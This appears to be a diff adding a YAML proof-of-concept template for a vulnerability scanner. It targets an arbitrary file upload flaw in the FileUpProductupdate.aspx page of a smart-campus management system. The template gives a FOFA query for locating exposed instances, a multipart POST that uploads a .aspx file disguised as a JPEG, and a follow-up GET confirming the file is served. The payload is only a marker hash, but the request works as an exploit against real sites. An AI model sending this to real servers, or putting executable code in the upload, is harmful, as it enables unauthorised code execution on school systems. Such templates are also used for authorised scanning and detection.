@@ -1,0 +1,32 @@
+id: poc-yaml-winstaryc-fileupproductupdate-aspx-anyfile-upload
+info:
+  name: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 智慧校园(安校易)管理系统
+  fofa: title="智慧综合管理平台登入"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Module/FileUpPage/FileUpProductupdate.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+  data: '------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------21909179191068471382830692394--'
+  expression: "status_code == 200 && \ncontains(body,\"MD5\") &&\ncontains(body,\"\
+    update.aspx\")\n"
+- method: GET
+  path: /Upload/Publish/000000/0_0_0_0/update.aspx
+  expression: status_code == 200 && body == t2
+transport: http
